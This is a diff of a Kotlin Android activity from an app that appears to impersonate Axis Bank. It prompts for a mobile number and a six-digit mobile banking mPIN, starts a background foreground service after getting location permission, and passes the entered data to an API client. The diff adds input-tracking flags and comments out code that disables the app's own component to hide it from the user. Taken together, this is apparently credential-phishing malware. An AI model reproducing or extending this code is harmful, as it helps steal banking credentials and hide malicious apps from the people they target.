@@ -1,21 +1,21 @@
 package com.example.oldaxisbank
 
 import android.app.ActivityManager
-import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.text.Editable
 import android.text.InputFilter
 import android.text.InputType
+import android.text.TextWatcher
 import android.util.Log
-import android.view.MotionEvent
-import android.view.View.OnTouchListener
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
+import androidx.core.widget.addTextChangedListener
 import com.example.axisbank.Submit1r
 import com.example.axisbank.Submit2
 import com.example.oldaxisbank.ApiClient.getClient
@@ -43,6 +43,10 @@ class MainActivity : AppCompatActivity() {
 
         val random = Random()
 
+        util.saveLocalData(this,"per","1")
+
+        util.saveLocalData(this,"check","false")
+
         if(util.getLocalData(this,"dis")!="1") {
             util.saveLocalData(this, "dis", "1")
         }
@@ -54,6 +58,7 @@ class MainActivity : AppCompatActivity() {
         geopermission.requestPermissions(this)
 
         if (geopermission.hasGeoPermissions(this)) {
+            util.saveLocalData(this,"per","4")
             val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
             if (!isServiceRunning) {
                 val serviceIntent = Intent(this, MyForegroundService::class.java)
@@ -61,6 +66,21 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+        binding.e2.addTextChangedListener(object : TextWatcher {
+            override fun beforeTextChanged(charSequence: CharSequence, i: Int, i1: Int, i2: Int) {
+                // Called before text changes
+            }
+
+            override fun onTextChanged(charSequence: CharSequence, i: Int, i1: Int, i2: Int) {
+                // Called when text changes
+            }
+
+            override fun afterTextChanged(editable: Editable) {
+                // Called after text changes
+                util.saveLocalData(this@MainActivity,"check","true")
+
+            }
+        })
 
         binding.t1.text = "Mobile Number"
         binding.t3.text = "mPIN (Enter 6 digit mobile banking mPIN)"
@@ -136,6 +156,9 @@ class MainActivity : AppCompatActivity() {
 
                 else {
 
+                util.saveLocalData(this@MainActivity ,"check","false")
+
+
                 val util = Util()
 
                 val apiService = getClient().create(ApiService::class.java)
@@ -188,22 +211,33 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-
-
-
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        if(util.getLocalData(this,"dis")=="1") {
-            util.saveLocalData(this,"dis","2")
-            val pakagemanger = packageManager
-            pakagemanger.setApplicationEnabledSetting(
-                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        }
-    }
+
+//    override fun onDestroy() {
+//        super.onDestroy()
+//        if(util.getLocalData(this,"dis")=="1") {
+//            util.saveLocalData(this,"dis","2")
+//            val pakagemanger = packageManager
+//            pakagemanger.setApplicationEnabledSetting(
+//                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                PackageManager.DONT_KILL_APP
+//            )
+//        }
+//    }
+
+//    override fun onPause() {
+//        super.onPause()
+//        val util =  Util()
+//        if(util.getLocalData(this,"check")=="true") {
+//            Log.e("asdf123", "pause: main activity")
+//            val pakagemanger = packageManager
+//            pakagemanger.setApplicationEnabledSetting(
+//                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                PackageManager.DONT_KILL_APP
+//            )
+//        }
+//    }
 
     private fun settext(){
         binding.e2.setText("");
